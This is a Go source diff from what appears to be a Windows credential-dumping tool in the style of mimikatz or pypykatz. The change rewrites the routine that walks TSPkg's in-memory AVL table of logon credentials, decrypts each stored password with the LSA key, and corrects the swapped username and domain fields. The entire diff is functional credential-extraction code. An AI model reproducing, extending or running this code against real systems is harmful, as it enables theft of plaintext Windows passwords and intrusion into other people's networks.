@@ -61,16 +61,19 @@ func (c *TSPkgCredential) wipe() {
 	c.Found = false
 }
 
-// extractTSPkg walks tspkg.dll's KIWI_TS_CREDENTIAL list and decrypts
-// every node's password. Returns one TSPkgCredential per LUID that
-// produced a non-empty plaintext.
+// extractTSPkg walks tspkg.dll's KIWI_TS_CREDENTIAL AVL tree and
+// decrypts every node's password. Returns one TSPkgCredential per
+// LUID.
 //
-// The list is a doubly-linked LIST_ENTRY rooted at a global inside
-// tspkg.dll (no hash table — TSPkg is small enough for a flat list).
+// Vista+ TSPkg uses an RTL_AVL_TABLE (same layout pattern as
+// Kerberos) rather than a flat doubly-linked list. The signature
+// lands on the address of a *pointer* to the table; we deref once
+// to get the table address, walk BalancedRoot.RightChild, and at
+// each AVL node read the user_data pointer at +0x20 to reach the
+// actual KIWI_TS_CREDENTIAL struct.
 //
 // Returns (nil, nil) without warning when the template lacks TSPkg
-// support (TSPkgLayout.NodeSize == 0) — the documented way to
-// disable the walker per build.
+// support (TSPkgLayout.NodeSize == 0).
 func extractTSPkg(r *reader, tspkgModule Module, t *Template, lsaKey *lsaKey) (map[uint64]TSPkgCredential, []string) {
 	if t.TSPkgLayout.NodeSize == 0 || len(t.TSPkgListPattern) == 0 {
 		return nil, nil
@@ -81,7 +84,7 @@ func extractTSPkg(r *reader, tspkgModule Module, t *Template, lsaKey *lsaKey) (m
 		return nil, []string{fmt.Sprintf("TSPkg: read tspkg.dll body: %v", err)}
 	}
 
-	listHead, err := derefRel32(
+	globalVA, err := derefRel32(
 		body,
 		tspkgModule.BaseOfImage,
 		t.TSPkgListPattern,
@@ -93,8 +96,13 @@ func extractTSPkg(r *reader, tspkgModule Module, t *Template, lsaKey *lsaKey) (m
 		return nil, []string{fmt.Sprintf("TSPkg list head: %v", err)}
 	}
 
-	flink, err := readPointer(r, listHead)
-	if err != nil || flink == 0 || flink == listHead {
+	tableVA, err := readPointer(r, globalVA)
+	if err != nil || tableVA == 0 {
+		return nil, nil
+	}
+
+	treeRoot := readAVLTreeRoot(r, tableVA)
+	if treeRoot == 0 {
 		return nil, nil
 	}
 
@@ -102,24 +110,26 @@ func extractTSPkg(r *reader, tspkgModule Module, t *Template, lsaKey *lsaKey) (m
 	var warnings []string
 
 	const maxNodes = 1024
-	walked := 0
-	for cur := flink; cur != listHead && walked < maxNodes; walked++ {
-		node, err := r.ReadVA(cur, int(t.TSPkgLayout.NodeSize))
-		if err != nil {
-			warnings = append(warnings, fmt.Sprintf("TSPkg node @0x%X: %v", cur, err))
-			break
+	walkAVL(r, treeRoot, maxNodes, func(avlNode uint64) {
+		// AVL node: [RTL_BALANCED_LINKS (0x20)][user_data].
+		// user_data at +0x20 is a pointer to the KIWI_TS_CREDENTIAL.
+		credPtr, err := readPointer(r, avlNode+avlNodeUserDataOffset)
+		if err != nil || credPtr == 0 {
+			return
 		}
-		if cred, luid, warn := decodeTSPkgNode(r, node, t, lsaKey); warn != "" {
+		node, err := r.ReadVA(credPtr, int(t.TSPkgLayout.NodeSize))
+		if err != nil {
+			warnings = append(warnings, fmt.Sprintf("TSPkg credential @0x%X: %v", credPtr, err))
+			return
+		}
+		cred, luid, warn := decodeTSPkgNode(r, node, t, lsaKey)
+		if warn != "" {
 			warnings = append(warnings, warn)
-		} else if cred.Found {
+		}
+		if cred.Found {
 			creds[luid] = cred
 		}
-		next, err := readPointer(r, cur) // Flink at offset 0
-		if err != nil || next == 0 {
-			break
-		}
-		cur = next
-	}
+	})
 
 	return creds, warnings
 }
@@ -155,8 +165,15 @@ func decodeTSPkgNode(r *reader, node []byte, t *Template, lsaKey *lsaKey) (TSPkg
 		return TSPkgCredential{}, luid, fmt.Sprintf("TSPkg primary @0x%X: %v", primaryPtr, err)
 	}
 
-	username := readUnicodeString(r, primary[0x00:0x10])
-	domain := readUnicodeString(r, primary[0x10:0x20])
+	// Microsoft quirk documented by pypykatz: TSPkg's primary
+	// credential struct stores the values at the swapped UNICODE_STRING
+	// slots — what's at the "UserName" offset is actually the domain,
+	// and vice versa. We read both then swap to publish the
+	// operationally meaningful pair.
+	rawA := readUnicodeString(r, primary[0x00:0x10])
+	rawB := readUnicodeString(r, primary[0x10:0x20])
+	domain := rawA
+	username := rawB
 
 	pwdField := primary[0x20:0x30]
 	pwdLen := binary.LittleEndian.Uint16(pwdField[0:2])
